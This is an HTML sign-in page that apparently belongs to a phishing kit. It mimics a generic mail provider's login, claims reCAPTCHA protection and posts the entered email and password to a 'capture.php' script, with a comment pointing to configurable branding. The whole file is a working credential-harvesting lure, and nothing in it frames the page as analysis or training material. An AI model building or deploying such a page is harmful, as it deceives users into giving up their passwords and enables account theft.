<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
  :root{
    --bg:#0f1115; --card:#161a22; --line:#2a3040;
    --ink:#e8ecf4; --mute:#8b93a7; --accent:#4c8dff;
    --err:#ff5c5c;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; background:var(--bg); color:var(--ink);
    font:15px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
    display:grid; place-items:center; padding:24px;
  }
  .card{
    width:100%; max-width:400px; background:var(--card);
    border:1px solid var(--line); border-radius:14px;
    padding:32px 28px; box-shadow:0 10px 40px rgba(0,0,0,.35);
  }
  h1{font-size:22px; margin:0 0 4px; font-weight:600}
  .sub{color:var(--mute); font-size:14px; margin:0 0 24px}
  label{display:block; font-size:13px; color:var(--mute); margin:0 0 6px}
  input{
    width:100%; padding:12px 14px; border-radius:10px;
    border:1px solid var(--line); background:#0d1016; color:var(--ink);
    font-size:15px; outline:none; transition:border-color .15s;
  }
  input:focus{border-color:var(--accent)}
  .field{margin:0 0 16px}
  button{
    width:100%; padding:12px; border-radius:10px; border:0;
    background:var(--accent); color:#fff; font-weight:600;
    font-size:15px; cursor:pointer; transition:filter .15s;
  }
  button:hover{filter:brightness(1.08)}
  button:disabled{opacity:.6; cursor:not-allowed}
  .err{color:var(--err); font-size:13px; margin:0 0 12px; display:none}
  .foot{color:var(--mute); font-size:12px; margin-top:20px; text-align:center}
</style>
</head>
<body>
<form class="card" id="f" action="capture.php" method="post" autocomplete="off">
  <h1 id="h">Sign in</h1>
  <p class="sub" id="s">to continue to Mail</p>

  <p class="err" id="e">Wrong password. Try again.</p>

  <div class="field">
    <label for="u">Email or phone</label>
    <input id="u" name="u" type="text" inputmode="email" required autofocus>
  </div>
  <div class="field">
    <label for="p">Password</label>
    <input id="p" name="p" type="password" required>
  </div>

  <button type="submit" id="b">Next</button>
  <p class="foot">Protected by reCAPTCHA — Privacy · Terms</p>
</form>

<script>
(function(){
  var f=document.getElementById('f'),
      b=document.getElementById('b'),
      e=document.getElementById('e'),
      u=document.getElementById('u'),
      p=document.getElementById('p');

  // live brand from config.php injected via meta
  f.addEventListener('submit',function(ev){
    if(!u.value.trim() || !p.value){ ev.preventDefault(); e.style.display='block'; return; }
    b.disabled=true; b.textContent='Signing in…';
  });
})();
</script>
</body>
  </html>
